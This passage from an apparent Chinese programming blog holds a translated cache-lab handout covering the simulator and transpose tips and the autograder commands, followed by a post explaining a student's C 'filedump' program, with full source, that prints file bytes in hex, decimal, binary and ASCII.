<p>对于每个测试，它都会显示你获得的积分数、缓存参数、输入的跟踪文件以及模拟器和参考模拟器的结果比较。</p>
<p>以下是有关Part A工作的一些提示和建议：</p>
<ul>
<li><p>对小trace（例如<code>traces/dave.trace</code>）进行初始调试。</p>
</li>
<li><p>参考模拟器采用可选的<code>-v</code>参数，该参数启用详细输出，显示由于每次内存访问而发生的命中、未命中和逐出。你不需要在<code>csim.c</code>代码中实现此功能，但是我们强烈建议你这样做。通过允许你直接将模拟器与参考跟踪文件上的参考模拟器的行为进行比较，它将帮助你进行调试。</p>
</li>
<li><p>我们建议你使用<code>getopt</code>函数来解析命令行参数。你需要以下头文件：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure>
<p>键入“<code>man 3 getopt</code>”以详细了解。</p>
</li>
<li><p>每个数据加载（L）或存储（S）操作最多可能导致一个高速缓存未命中。数据修改操作（M）被视为加载，然后将其存储到同一地址。因此，M操作可能导致两个高速缓存命中，或者未命中和命中再加上可能的逐出。</p>
</li>
<li><p>如果你想使用15-122中的C0样式，则可以包含头文件<code>contracts.h</code>。为方便起见，我们在文件目录中提供了。</p>
</li>
</ul>
<h2 id="Working-on-Part-B"><a href="#Working-on-Part-B" class="headerlink" title="Working on Part B"></a>Working on Part B</h2><p>我们为你提供了一个称为<code>test-trans.c</code>的自动分级程序，该程序可以测试你向自动分级机注册的每个移调功能的正确性和性能。</p>
<p>你可以在<code>trans.c</code>文件中注册多达100个版本的转置函数。 每个转置版本具有以下形式：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* Header comment */</span></span><br><span class="line"><span class="keyword">char</span> trans_simple_desc[] = <span class="string">&quot;A simple transpose&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">trans_simple</span><span class="params">(<span class="keyword">int</span> M, <span class="keyword">int</span> N, <span class="keyword">int</span> A[N][M], <span class="keyword">int</span> B[M][N])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* your transpose code here */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>在<code>trans.c</code>中的寄存器函数例程中，通过调用以下形式向自动分级器注册特定的转置函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">registerTransFunction(trans_simple, trans_simple_desc);</span><br></pre></td></tr></table></figure>
<p>在运行时，自动分级机将评估每个已注册的转置函数并打印结果。 当然，注册函数之一必须是你要提交的<code>transpose_submit</code>函数：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">registerTransFunction(transpose_submit, transpose_submit_desc);</span><br></pre></td></tr></table></figure>
<p>有关如何工作的示例，请参见默认的<code>trans.c</code>函数。</p>
<p>自动分级机将矩阵大小作为输入。它使用<code>valgrind</code>生成每个已注册转置函数的跟踪。然后，它通过在具有参数（s = 5，E = 1，b = 5）的缓存上运行参考模拟器来评估每个跟踪。</p>
<p>例如，要在32×32矩阵上测试注册的转置函数，重建<code>test-trans</code>，然后使用M和N的适当值运行它：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> make</span></span><br><span class="line"><span class="meta">linux&gt;</span><span class="bash"> ./test-trans -M 32 -N 32</span></span><br><span class="line">Step 1: Evaluating registered transpose funcs for correctness:</span><br><span class="line">func 0 (Transpose submission): correctness: 1</span><br><span class="line">func 1 (Simple row-wise scan transpose): correctness: 1</span><br><span class="line">func 2 (column-wise scan transpose): correctness: 1</span><br><span class="line">func 3 (using a zig-zag access pattern): correctness: 1</span><br><span class="line"></span><br><span class="line">Step 2: Generating memory traces for registered transpose funcs.</span><br><span class="line"></span><br><span class="line">Step 3: Evaluating performance of registered transpose funcs (s=5, E=1, b=5)</span><br><span class="line">func 0 (Transpose submission): hits:1766, misses:287, evictions:255</span><br><span class="line">func 1 (Simple row-wise scan transpose): hits:870, misses:1183, evictions:1151</span><br><span class="line">func 2 (column-wise scan transpose): hits:870, misses:1183, evictions:1151</span><br><span class="line">func 3 (using a zig-zag access pattern): hits:1076, misses:977, evictions:945</span><br><span class="line"></span><br><span class="line">Summary for official submission (func 0): correctness=1 misses=287</span><br></pre></td></tr></table></figure>
<p>在此示例中，我们在<code>trans.c</code>中注册了四个不同的转置函数。 <code>test-trans</code>程序测试每个注册功能，显示每个功能的结果，并提取结果以供正式提交。</p>
<p>这是有关Part B工作的一些提示和建议。</p>
<ul>
<li><p><code>test-trans</code>程序将函数<code>i</code>的跟踪保存在文件<code>trace.fi</code>中（因为<code>valgrind</code>引入了许多与你的代码无关的堆栈访问，所以我们从跟踪中过滤掉了所有堆栈访问。 这就是为什么我们禁止使用局部数组并限制局部变量数量的原因）。<br>宝贵的调试工具，可以帮助你准确了解每个转置功能的来历。 要调试特定功能，只需使用详细选项通过引用模拟器运行其跟踪：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> ./csim-ref -v -s 5 -E 1 -b 5 -t trace.f0</span></span><br><span class="line">S 68312c,1 miss</span><br><span class="line">L 683140,8 miss</span><br><span class="line">L 683124,4 hit</span><br><span class="line">L 683120,4 hit</span><br><span class="line">L 603124,4 miss eviction</span><br><span class="line">S 6431a0,4 miss</span><br><span class="line">...</span><br></pre></td></tr></table></figure></li>
<li><p>由于正在直接映射的缓存上评估转置函数，因此冲突遗漏是一个潜在的问题。考虑一下代码中可能发生冲突遗漏的可能性，尤其是对角线。尝试考虑将减少这些冲突未命中次数的访问模式。</p>
</li>
<li><p>阻塞是减少缓存未命中的有用技术。<em>公众号后台回复“<code>waside-blocking</code>”以获得更多信息。</em></p>
</li>
</ul>
<h2 id="Putting-it-all-Together"><a href="#Putting-it-all-Together" class="headerlink" title="Putting it all Together"></a>Putting it all Together</h2><p>我们为你提供了一个名为<code>./driver.py</code>的驱动程序，可以对你的模拟器和转置代码进行完整的评估。这和你的教师评估你的作业使用的是同一程序。驱动程序使用<code>test-csim</code>评估模拟器，并使用<code>test-trans</code>评估三种矩阵大小的提交的转置函数。然后打印出你的结果和所获得的积分的摘要。</p>
<p>要运行驱动程序，请键入：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">linux&gt;</span><span class="bash"> ./driver.py</span></span><br></pre></td></tr></table></figure>
<h1 id="Handing-in-Your-Work"><a href="#Handing-in-Your-Work" class="headerlink" title="Handing in Your Work"></a>Handing in Your Work</h1><p>每次在<code>cachelab-handout</code>目录中键入<code>make</code>时，<code>Makefile</code>都会创建一个名为<code>userid-handin.tar</code>的压缩文件，其中包含当前的<code>csim.c</code>和<code>trans.c</code>文件。</p>
<p>重要说明：请勿在Windows或Mac计算机上创建要上交的压缩包，也不要上交任何其他存档格式的文件，例如<code>.zip</code>、<code>.gzip</code>或<code>.tgz</code>文件。</p>
]]></content>
      <tags>
        <tag>Computer Systems</tag>
        <tag>Lab Assignments</tag>
      </tags>
  </entry>
  <entry>
    <title>D!U!M!P!</title>
    <url>/Computer-Systems-Experiment-1/</url>
    <content><![CDATA[<p>Computer Systems Experiment #1 - 编写一个C程序：filedump，用于显示规定格式的某个文件的实际字节信息。</p>
<a id="more"></a>

<blockquote>
<ul>
<li>实际需求如下：假定你编写的程序，编译后为filedump.exe, 需要显示内容的文件名时file1.dat，在控台上输入以下命令，注意输出信息要清晰规整。无法显示的ASCII码用？号或escape字符显示，参照ASCII码表红色标记的部分。不符合以下的输入内容，需要显示程序的使用方法。</li>
</ul>
<ol>
<li>Filedump -x file1.dat   将显示如下内容的信息，每行显示16个字节的内容，首行显示字节的ASCII码结果(小于0x20用ASCII码表的替代字符)，接下的一行为该字节的16进制数值，大于16字节时重复这种方式显示信息。</li>
<li>Filedump -X file1.dat   将显示如下内容的信息，每行显示16个字节的16进制内容，空2个单角空格，继续显示这16个字节的ASCII码。大于16字节时重复这种方式显示信息。不可显示字符用句点代替 “.”</li>
<li>Filedump -d file1.dat   将显示如下内容的信息，每行显示16个字节的内容，首行显示字节的ASCII码结果(小于0x20用ASCII码表的替代字符) ，接下的一行为该字节的10进制数值，大于16字节时重复这种方式显示信息。</li>
<li>Filedump -D file1.dat   将显示如下内容的信息，每行显示16个字节的10进制内容，空2个单角空格，继续显示这16个字节的ASCII码。大于16字节时重复这种方式显示信息。不可显示字符用句点代替 “.”</li>
<li>Filedump -b file1.dat   将显示如下内容的信息，每行显示4个字节的内容，首行显示字节的ASCII码结果(小于0x20用ASCII码表的替代字符)，接下的一行为该字节的二进制数值，大于4字节时重复这种方式显示信息。</li>
<li>Filedump -B file1.dat   将显示如下内容的信息，每行显示4个字节的二进制内容，空2个单角空格，继续显示这4个字节的ASCII码。大于4字节时重复这种方式显示信息。不可显示字符用句点代替 “.”</li>
</ol>
</blockquote>
<p>首先，题目要求编写一个C程序，为此需要掌握C程序的语法，尤其是<code>printf()</code>函数等有别于C++的地方。<br><a href="https://docs.microsoft.com/en-us/cpp/c-language/arguments-to-main?view=vs-2019">轻触以了解argc与argv的用法</a><br><a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/printf-printf-l-wprintf-wprintf-l?view=vs-2019">轻触以了解printf等函数的用法</a><br><a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/strcmp-wcscmp-mbscmp?view=vs-2019">轻触以了解C字符串比较函数的用法</a><br>题目的要求就是将一个已知的文件用此程序展开，其输出为文件中字符的ASCII码结果、16进制结果、10进制结果和2进制结果等形式，并符合对输出格式的要求。<br>最初应该建立起程序的框架，即对应不同的选项（<code>-x</code>、<code>-X</code>、<code>-d</code>、<code>-D</code>、<code>-b</code>与<code>-B</code>），程序可以输出不同的结果，应该考虑用<code>if</code>分支或<code>switch</code>分支。<br>而对于数量较多的情况，最好使用<code>switch</code>分支。但在判断输入情况时，若使用<code>strcmp</code>函数比较，则使用<code>if</code>分支更好，所以这里选择用<code>if</code>。<br>要注意，为了避免输入其他格式造成不可预知的后果，这里应该考虑各种可能输入的情况，并对于不符合要求的情况，输出正确的形式以引导。<br>接下来就是对文件的读取。<br><a href="https://docs.microsoft.com/en-us/cpp/c-runtime-library/reference/fopen-wfopen?view=vs-2019">轻触以了解fopen等函数的用法</a><br>每读取一个字符，应该根据输入的选项，输出相应的格式。由于输出为整行输出，应该先把字符存入数组，接下来则对数组进行打印。为适应多种情况输出，应该构造不同函数来实现。<br>同样，对于文件中的特殊字符，应该考虑到其输出格式，而不应该输出乱码。读取文件时，应该注意<code>argv[]</code>角标是2而不是1。<br>为了使输出格式尽量整齐美观，对于打印字符的函数，分为了三种情况，分别对应输出双行、双列以及2进制数的情况。<br>对于小于0x20的情况，应把替代字符预先存入数组以便于输出。若输出只有一行或者两行的情况，应该考虑数组是否全面。<br>另外要注意<code>char</code>型变量的范围，必要时使用<code>unsigned char</code>来声明变量，防止判断条件时出错。<br>老师的代码中用下面的方式输出2进制；</p>
<pre><code>printf(&quot;%c&quot;, (line[i] &amp; (0x80 &gt;&gt; j)) != 0 ? &#39;1&#39; : &#39;0&#39;);
</code></pre>
<p>和移位后0x80（10000000右移j位）取与位运算，比对2进制位1和0来将其转换为2进制。<br>用<code>printf()</code>函数打印<code>char</code>型变量时，如果最高位是1，即超过0x7f，当%x格式化输出时会将其扩展到<code>int</code>型的32位。这也是输出出现fffffff的原因。<br>写完程序后可以用<code>file.dat</code>文件测试程序的功能是否完善，输出存放在<code>list-x.txt</code>文件中。<br>测试时应注意，exe可执行文件应与测试文件（如<code>file.dat</code>）位于同一文件夹下，否则需要输入文件相对路径。若使用VSCode，应保证.vscode文件夹下只有json文件，而其他文件位于其之外。</p>
<p>最后，我的解决方案如下：</p>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printASCIICharleft</span><span class="params">(<span class="keyword">char</span>*, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printASCIICharright</span><span class="params">(<span class="keyword">char</span>*, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printASCIICharbin</span><span class="params">(<span class="keyword">char</span>*, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printDec</span><span class="params">(<span class="keyword">char</span>*, <span class="keyword">int</span>, <span class="keyword">char</span>*)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printBin</span><span class="params">(<span class="keyword">char</span>*, <span class="keyword">int</span>)</span></span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> LINELEN1 = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> LINELEN2 = <span class="number">4</span>;</span><br><span class="line"><span class="keyword">int</span> len = <span class="number">16</span>;</span><br><span class="line"><span class="keyword">char</span> *ascii[]=&#123; \</span><br><span class="line">    <span class="string">&quot;NUL&quot;</span>, <span class="string">&quot;SOH&quot;</span>, <span class="string">&quot;STX&quot;</span>, <span class="string">&quot;ETX&quot;</span>, <span class="string">&quot;EOT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ENQ&quot;</span>, <span class="string">&quot;ACK&quot;</span>, <span class="string">&quot;BEL&quot;</span>, <span class="string">&quot;BS&quot;</span>, <span class="string">&quot;TAB&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LF&quot;</span>, <span class="string">&quot;VT&quot;</span>, <span class="string">&quot;FF&quot;</span>, <span class="string">&quot;CR&quot;</span>, <span class="string">&quot;SO&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SI&quot;</span>, <span class="string">&quot;DLE&quot;</span>, <span class="string">&quot;DC1&quot;</span>, <span class="string">&quot;DC2&quot;</span>, <span class="string">&quot;DC3&quot;</span>,</span><br><span class="line">    <span class="string">&quot;DC4&quot;</span>, <span class="string">&quot;NAK&quot;</span>, <span class="string">&quot;SYN&quot;</span>, <span class="string">&quot;ETB&quot;</span>, <span class="string">&quot;CAN&quot;</span>,</span><br><span class="line">    <span class="string">&quot;EM&quot;</span>, <span class="string">&quot;SUB&quot;</span>, <span class="string">&quot;ESC&quot;</span>, <span class="string">&quot;FS&quot;</span>, <span class="string">&quot;GS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;RS&quot;</span>, <span class="string">&quot;US&quot;</span>, <span class="string">&quot; &quot;</span>, <span class="string">&quot;!&quot;</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> data;</span><br><span class="line">    <span class="keyword">int</span> loc = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> line1[LINELEN1];</span><br><span class="line">    <span class="keyword">char</span> line2[LINELEN2];</span><br><span class="line">    <span class="comment">// receive arguments from command line</span></span><br><span class="line">    <span class="keyword">if</span> (argc != <span class="number">3</span>) &#123;</span><br><span class="line">        <span class="comment">// the usage was wrong</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;ERROR! Usage: \&quot;filedump -xXdDbB filename\&quot;\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-x/X to dump by hexadecimal\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-d/D to dump by decimal\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;-b/B to dump by binary\n&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;filename is name of the file whose contents you want to dump\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ( <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-x&quot;</span>) &amp;&amp;</span><br><span class="line">                <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-X&quot;</span>) &amp;&amp;</span><br><span class="line">                <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-d&quot;</span>) &amp;&amp;</span><br><span class="line">                <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-D&quot;</span>) &amp;&amp;</span><br><span class="line">                <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-b&quot;</span>) &amp;&amp;</span><br><span class="line">                <span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-B&quot;</span>) ) &#123;</span><br><span class="line">                    <span class="comment">// wrong usage too</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;ERROR! Usage: \&quot;filedump -xXdDbB filename\&quot;\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;-x/X to dump by hexadecimal\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;-d/D to dump by decimal\n&quot;</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;-b/B to dump by binary\n&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="number">-2</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// creat datafile from argv[2]</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// open file for binary read</span></span><br><span class="line">    FILE *fp = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">// read binary mode</span></span><br><span class="line">    fp = fopen(argv[<span class="number">2</span>], <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (fp == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="comment">// failed opening</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;failed when opening %s\n&quot;</span>, argv[<span class="number">2</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (!feof(fp)) &#123;</span><br><span class="line">        <span class="comment">// get 1 byte of char</span></span><br><span class="line">        data = fgetc(fp);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// define linelength</span></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-x&quot;</span>) ||</span><br><span class="line">            !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-X&quot;</span>) ||</span><br><span class="line">            !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-d&quot;</span>) ||</span><br><span class="line">            !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-D&quot;</span>)) &#123;</span><br><span class="line">            len = LINELEN1;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (loc &lt; len &amp;&amp; (!feof(fp))) &#123;</span><br><span class="line">                line1[loc] = data;</span><br><span class="line">                loc++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// print linelen chars</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-x&quot;</span>)) &#123;</span><br><span class="line">                    printASCIICharleft(line1, len);</span><br><span class="line">                    printDec(line1, len, <span class="string">&quot;%2.2x\t&quot;</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-X&quot;</span>)) &#123;</span><br><span class="line">                    printDec(line1, len, <span class="string">&quot;%2.2x\t&quot;</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">                    printASCIICharright(line1, len);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-d&quot;</span>)) &#123;</span><br><span class="line">                    printASCIICharleft(line1, len);</span><br><span class="line">                    printDec(line1, len, <span class="string">&quot;%03d\t&quot;</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-D&quot;</span>)) &#123;</span><br><span class="line">                    printDec(line1, len, <span class="string">&quot;%03d\t&quot;</span>);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">                    printASCIICharright(line1, len);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                loc = <span class="number">0</span>;</span><br><span class="line">                line1[loc] = data;</span><br><span class="line">                loc++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            len = LINELEN2;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (loc &lt; len &amp;&amp; (!feof(fp))) &#123;</span><br><span class="line">                line2[loc] = data;</span><br><span class="line">                loc++;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// print linelen chars</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-b&quot;</span>)) &#123;</span><br><span class="line">                    printASCIICharbin(line2, len);</span><br><span class="line">                    printBin(line2, len);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(argv[<span class="number">1</span>], <span class="string">&quot;-B&quot;</span>)) &#123;</span><br><span class="line">                    printBin(line2, len);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">                    printASCIICharright(line2, len);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                loc = <span class="number">0</span>;</span><br><span class="line">                line2[loc] = data;</span><br><span class="line">                loc++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fclose(fp);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print ASCII char</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printASCIICharleft</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">line</span>, <span class="keyword">int</span> linelen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> eachData;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; linelen; i++) &#123;</span><br><span class="line">        eachData = <span class="built_in">line</span>[i];</span><br><span class="line">        <span class="keyword">if</span> (eachData &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c\t&quot;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (eachData &lt;= <span class="number">0x20</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\t&quot;</span>, ascii[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)eachData]); <span class="comment">// unsigned char</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c\t&quot;</span>, eachData);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printASCIICharright</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">line</span>, <span class="keyword">int</span> linelen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> eachData;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; linelen; i++) &#123;</span><br><span class="line">        eachData = <span class="built_in">line</span>[i];</span><br><span class="line">        <span class="keyword">if</span> (eachData &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (eachData &lt;= <span class="number">0x20</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s&quot;</span>, ascii[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)eachData]); <span class="comment">// unsigned char</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, eachData);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printASCIICharbin</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">line</span>, <span class="keyword">int</span> linelen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> eachData;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; linelen; i++) &#123;</span><br><span class="line">        eachData = <span class="built_in">line</span>[i];</span><br><span class="line">        <span class="keyword">if</span> (eachData &lt; <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c\t\t&quot;</span>, <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (eachData &lt;= <span class="number">0x20</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%s\t\t&quot;</span>, ascii[(<span class="keyword">unsigned</span> <span class="keyword">char</span>)eachData]); <span class="comment">// unsigned char</span></span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c\t\t&quot;</span>, eachData);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print decimal &amp;&amp; hexadecimal</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printDec</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">line</span>, <span class="keyword">int</span> linelen, <span class="keyword">char</span> *fmt)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; linelen; i++)</span><br><span class="line">        <span class="built_in">printf</span>(fmt, (<span class="keyword">unsigned</span> <span class="keyword">char</span>)<span class="built_in">line</span>[i]); <span class="comment">// unsigned char</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// print binary</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printBin</span><span class="params">(<span class="keyword">char</span> *<span class="built_in">line</span>, <span class="keyword">int</span> linelen)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; linelen; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">8</span>; j++)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, (<span class="built_in">line</span>[i] &amp; (<span class="number">0x80</span> &gt;&gt; j)) != <span class="number">0</span> ? <span class="string">&#x27;1&#x27;</span> : <span class="string">&#x27;0&#x27;</span>); <span class="comment">// get binary method</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的<code>list-x.txt</code>文件如下：</p>
